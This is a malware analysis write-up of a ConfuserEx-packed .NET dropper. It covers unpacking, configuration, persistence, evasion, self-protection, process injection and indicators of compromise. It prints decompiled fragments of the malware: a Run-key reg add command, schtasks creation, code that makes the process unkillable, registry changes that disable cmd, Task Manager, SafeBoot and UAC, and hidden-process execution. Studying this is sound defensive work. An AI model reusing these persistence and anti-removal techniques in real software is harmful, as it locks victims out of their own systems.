Packed Unknwon .NET - Stage 2

MD5: e6e36b397f4f074503ee9a519593fdbf

File: stage2.false

Original name: "stub.exe"

TL;DR: .Net dropper that uses some clever techniques to do it's job, but with a freacking high footprint from an analyst point of view. ConfuserEx packed.

==================================================

# Unpack

This file is packed by ConfuserEx version 1.0.0:
```
[module: SuppressIldasm]
[module: ConfusedBy("ConfuserEx v1.0.0")]
[module: UnverifiableCode]
```

Let's hope this is a standard ConfuserEx packed binary, otherwise this is going to be a real pain to unpack ...

As usuall, the Main method is garbage. In fact DnSpy is not able to decompile it:
```
// Token: 0x0200000C RID: 12
	internal class stub
	{
		// Token: 0x0600005B RID: 91 RVA: 0x00007818 File Offset: 0x00005C18
		private static void Main(string[] args)
		{
			/*
An exception occurred when decompiling this method (0600005B)

ICSharpCode.Decompiler.DecompilerException: Error decompiling System.Void StubCode.stub::Main(System.String[])

 ---> System.ArgumentNullException: Value cannot be null. (Parameter 'key')
   at System.Collections.Generic.Dictionary`2.FindEntry(TKey key)
   at System.Collections.Generic.Dictionary`2.get_Item(TKey key)
   at ICSharpCode.Decompiler.ILAst.SimpleControlFlow.JoinBasicBlocks(List`1 body, ILBasicBlock head, Int32 pos) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\SimpleControlFlow.cs:line 432
```

In DnSpy, let's search for the ".cctor" (class contructor) module. This is the equivalent of the TLS section for .Net binary: this section runs before the Main() method.

The first call is probably the ConfuserEx anti-tamper mechanism followed by the code restoration schema and stuff:
```
// Token: 0x02000001 RID: 1
internal class <Module>
{
	// Token: 0x06000001 RID: 1 RVA: 0x00010048 File Offset: 0x0000D248
	static <Module>()
	{
		<Module>.\u202B\u200B\u200F\u206F\u206A\u206A\u206A\u206A\u202E\u200E\u206C\u200F\u206A\u202D\u202A\u202E\u206A\u200C\u206F\u200D\u200B\u200B\u206D\u200D\u200E\u206B\u202C\u206D\u206A\u202A\u206A\u206E\u206A\u206A\u206E\u200F\u202E\u206F\u202A\u202E();
```

We can right away use the UnConfuserEx tool to restore the binary:
```
C:\Users\user\Desktop>"UnConfiuserEx\ConfuserEx Dynamic Unpacker.exe" -s "Formbook - stage 2\stage2.false"
Yeah confuserex unpacker so what
[!] Anti Tamper Detected
[!] Anti Tamper Removed Successfully
[!] Cleaning Proxy Calls
[!] Amount Of Proxy Calls Fixed: 331
[!] Decrytping Strings
[!] Amount Of Strings Decrypted: 171
```

And it seems to have worked perfectely.

We can now try to observe the cleaned binary in DnSpy, and we got some juicy methods name:
```
AddToStartup(): void @060000076
AntiDump(): void @060000080
BypassAvastScan(): void @06000005E
[...]
Decompress(): void @060000068
[...]
```

And many more ...

==================================================

# Analysis

## Malware Configuration
The configuration file for this malware can be found in the resources of the binary, under the name 'STUB'.

It contains a list of 44 plaintext options stored as 'key:value'

The most important one (focus on detection) are the following:
```
MUTEX‎ = "n9zsTWMxkC3Dpzb"
StartupFileName‎ = "cnxuoiren.exe"
StartupName‎ = "cnxuoirenmcxcz"
```

What's strange is that the majority of protection mechanisms or custom options are set to False:
```
AntiSandboxie‎ = False
AntiDump‎ = False
PersistenceSystemWide‎ = False
ProtectionAntiMemory‎ = False
[...]
```

We can only observe that only the persistence mechanism is activated:
```
// 0x000317B3: StartupEnabled‎ = True
// 0x000317B5: StartupFileName‎ = "cnxuoiren.exe"
// 0x000317C4: StartupFolderName‎ = ""
// 0x000317C6: StartupForceRestart‎ = False
// 0x000317C8: StartupLocation‎ = "Startup"
// 0x000317D1: StartupMelt‎ = False
// 0x000317D3: StartupName‎ = "cnxuoirenmcxcz"
// 0x000317E3: StartupTask‎ = "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\r\n<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">  
```

A XML template for the persistence method can aslo be found, bind to the configuration file:
```xml
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2014-10-25T14:27:44.8929027</Date>
    <Author>%USER%</Author>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
      <UserId>%USER%</UserId>
    </LogonTrigger>
    <RegistrationTrigger>
      <Enabled>false</Enabled>
    </RegistrationTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>%USER%</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>StopExisting</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>%COMMAND%</Command>
	  <Arguments>%ARGUMENTS%</Arguments>
    </Exec>
  </Actions>
</Task>
```	

For the next parts, I'll act as if every protection mechanissm and fonctionnalities were turned on, as it would be a bit boring otherwise :)

==================================================

## Persistence

The malware can gain persistence through two techniques.

The first one is by adding an entry in the "Run" HKEY:
```C#
string args = string.Format("reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /f /v \"{0}\" /d \"cmd /c type \"{1}\" | cmd\" & exit", 
	stub.GetSetting<string>("StartupName"), text);
	stub.StartProcess("cmd", args);
```

The second one is by creating a new scheduled task, with the parameters comming from the XML file bind to the configuration's file.

To summarize, the commented and simplified version is:
```C#
xml_template = xml_template.Replace("%USER%", self_username);
xml_template = xml_template.Replace("%COMMAND%", "cmd");
xml_template = xml_template.Replace("%ARGUMENTS%", string.Format("/c type \"{0}\" | cmd", startup_name_from_conf));
File.WriteAllText(random_xml_name, xml_template);
stub.StartProcess("cmd", "schtasks.exe /Delete /TN \Update\\<startup_name_from_conf> \ /F & exit");
stub.StartProcess("cmd", "schtasks.exe /Create /TN \Update\\<startup_name_from_conf> \ /XML \ random_xml_name \ & exit");
File.Delete(random_xml_name);
```

==================================================

## Evasion

Some basic anti-analysis tricks are used in order to detect and mess with the system's AV or to detect the use of sandbox.

For antivirus evasion, a delayed exection of 500 seconds is used (which should be more than enough to wait for the end of an AV sandbox doing some heuristics without patching the time.

The only attempt to detect sandbox artifacts is by looking up if the "SbieDll.dll" shared library is loaded in memory. This one is used by the user-mode sandbox 'Sandboxie'.

==================================================

## Self protections

Basicaly, this malware makes removal of itself almost impossible by setting some heavy restrictions on the computer.

In order to be effective, the malware need to be run as admin, or must succeed it's privilege escalation.

A wrapper for protection's mechanisms is used in conjunction with the options available in the configuration's file:
```C#
private static List<string> GetProcessKiller()
{
	List<string> list = new List<string>();
	foreach (string text in stub.GetSetting<string[]>("ProcessKiller"))
	{
		list.Add(text.ToLower());
	}
	if (stub.GetSetting<bool>("DisableTaskManager"))
	{
		list.Add("taskmgr");
	}
	if (stub.GetSetting<bool>("DisableSystemRestore"))
	{
		list.Add("rstrui");
	}
	if (stub.GetSetting<bool>("DisableCMD"))
	{
		list.Add("cmd");
	}
	return list;
}
```

The sample disable the use of cmd.exe on the infected computer as a protection mecanism, through the system registry key:
```
Software\\Policies\\Microsoft\\Windows\\DisableCMD set to 0x1
```

It also disable the SafeBoot recovery option of the OS by removing the following registry keys:
```
System\\CurrentControlSet\\Control\\SafeBoot\\Minimal
System\\CurrentControlSet\\Control\\SafeBoot\\Network
```

The task manager is also removed, by setting:
```
Software\\Microsoft\\Windows\\CurrentVersion\\DisableTaskMgr
```

The UAC is disabled, in order to elevate it's privileges easily:
```
SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableUAC set to 0x0
```

We can observe a heavy use of VirtualProtect native API call is done to ensure that an automated process would not be able to access (and dump) the content of memory regions own by the malware.

Finaly, the malware makes itself un-killable through the creation of a new kernel object security descriptor that would raise an 'ACCESS_DENIED' whenever someone or something tries to kill the process from userl-and:

```C#
rawSecurityDescriptor.DiscretionaryAcl.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, Convert.ToInt32(987135), new SecurityIdentifier(WellKnownSidType.WorldSid, null), false, null));
array = new byte[rawSecurityDescriptor.BinaryLength];
rawSecurityDescriptor.GetBinaryForm(array, 0);
stub.SetKernelObjectSecurity(handle, 4, array);
```

==================================================

## Injection

In order to evade security product, and keep a low footprint for the user perspective, the malware is able to inject iselft into running process.

6 injections points are available, and can be controlled through the configuration file:
```C#
* Into itself (?)
* regasm.exe
* svchost.exe
* vbc.exe
* The default browser, found under "Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice"
* winlogon.exe
```

The injection is a simple PE injection with WriteProcessMemory() in the target process.

==================================================

## MISC

In order to download further components without raising any security warning, the "Zone Identifier" of the computer is set to "trusted site zone" by invoking a hidden cmd command:
```C#
Process process = new Process();
process.StartInfo.FileName = "cmd.exe";
process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
process.StartInfo.Arguments = "/c echo [zoneTransfer]ZoneID = 2 > \"" + filename + "\":ZONE.identifier & exit";
process.Start();
process.WaitForExit();
```

Every time it needs to execute commands or interact with the OS, the malware start a new hidden process to do it's business (which is freacking ugly):
```C#
Process process = new Process();
process.StartInfo.FileName = prc;
process.StartInfo.UseShellExecute = false;
process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
process.StartInfo.CreateNoWindow = true;
process.StartInfo.RedirectStandardInput = true;
process.StartInfo.RedirectStandardOutput = true;
process.Start();
process.StandardInput.WriteLine(args);
process.WaitForExit();
```

When it drop a file, the creation date is modified to looks older than it is:
```
CreationDateValue‎ = 8/10/2016 9:36:12 AM
```

It also modify the file's attributes to hide it:
```C#
	fileInfo.Attributes |= FileAttributes.Hidden;
or
	fileInfo.Attributes |= FileAttributes.System;
```

==================================================

# IOCs:
* Mutex: "n9zsTWMxkC3Dpzb"
* File: "cnxuoiren.exe"
* Scheduled Task Name: "cnxuoirenmcxcz"
* Files with Specific CreationDate timestamp of: " 8/10/2016 9:36:12 AM"
* Registry Key: "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\cnxuoiren.exe"
